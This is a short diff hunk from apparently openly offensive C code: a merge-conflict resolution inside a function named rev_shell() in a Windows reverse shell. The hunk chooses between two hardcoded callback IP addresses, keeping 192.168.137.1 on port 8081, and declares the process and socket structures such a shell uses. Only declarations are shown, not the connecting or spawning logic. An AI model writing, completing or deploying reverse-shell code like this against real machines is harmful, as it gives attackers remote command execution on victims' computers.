@@ -60,11 +60,7 @@ void rev_shell() {
     STARTUPINFO sinfo;
     PROCESS_INFORMATION pinfo;
     struct sockaddr_in shell_addr;
-<<<<<<< HEAD
     char ip_addr[] = "192.168.137.1";
-=======
-    char ip_addr[] = "192.168.40.131";
->>>>>>> be7213c651bfdc35e5c35a187322670d3b4ad143
     char RecData[512];
     int port = 8081;
     int connection;
